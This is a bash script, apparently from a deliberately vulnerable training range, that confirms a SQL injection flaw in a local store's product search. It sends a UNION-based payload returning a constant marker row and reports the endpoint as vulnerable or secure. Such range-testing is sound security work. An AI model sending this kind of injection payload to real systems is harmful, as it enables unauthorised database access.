#!/usr/bin/env bash
# VULN-SQLI-01 — confirm SQL injection in product search with a BENIGN marker.
# Sends a UNION that returns a constant row; reads no sensitive table. Local range only.
set -eu
cd "$(dirname "$0")/.."
. ./_lib.sh

need curl
guard_localhost
require_store

# Close the ILIKE string, UNION a single constant row, comment out the rest.
# Columns: id, sku, name, price, stock, image_url  -> prove control over the result set only.
PAYLOAD="zzz%' UNION SELECT 999999,'SQLI-PROOF','injection marker',0,0,NULL-- "

echo "VULN-SQLI-01 — does a crafted search term change the SQL?"
hr

# URL-encode the query with curl itself.
resp=$(curl -s -m 10 -G "$STORE/api/products/search" --data-urlencode "q=$PAYLOAD")

if printf '%s' "$resp" | grep -q 'SQLI-PROOF'; then
    echo "VULNERABLE: the injected UNION row came back (SKU 'SQLI-PROOF')."
    echo "  The search text changed the SQL statement — this is an injection point."
    echo "  → Flip VULN-SQLI-01 to secure in Range Control and re-run; the marker will be gone."
elif printf '%s' "$resp" | grep -qiE 'error|exception|npgsql'; then
    echo "Got a database error instead of the marker — likely vulnerable but the payload needs"
    echo "adjusting. Inspect the store-api logs / Npgsql span for the executed SQL."
else
    echo "SECURE: no marker row. The term was treated as a literal search string (bound parameter)."
fi
